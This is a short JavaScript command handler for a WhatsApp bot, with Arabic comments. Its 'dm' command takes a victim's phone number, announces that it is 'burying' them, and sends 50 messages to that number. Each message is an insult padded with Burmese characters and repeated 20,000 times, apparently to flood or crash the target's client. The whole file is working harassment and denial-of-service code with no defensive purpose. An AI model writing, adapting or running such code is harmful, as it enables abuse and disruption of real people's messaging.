const handler = async (m, { conn, text, usedPrefix, command }) => {
  if (!text) throw `قم بإضافة رقم الشخص المستهدف بعد الأمر "dm". \n مثال: ${usedPrefix}dm + رقم الهاتف على واتساب`;

  // تنظيف الرقم من العلامة "+" والمسافات والأشارات "-"
  let cleanedNumber = text.replace(/\+|\s|-/g, '');

  // إرسال رسالة "جاري قبر + رقم الشخص"
  conn.reply(m.chat, `جاري قبر ${cleanedNumber}`, m);

  let message = '*~DarkMD~*' + 'ဪဪဪ' + 'ဪFuckYouဪ';
  let multipliedMessage = message.repeat(20000);

  for (let i = 0; i < 50; i++) {
    conn.reply(cleanedNumber + '@s.whatsapp.net', multipliedMessage, null, { contextInfo: { mentionedJid: [m.sender] } });
  }
};
handler.command = /^(dm)$/i;
handler.rowner = true;
export default handler;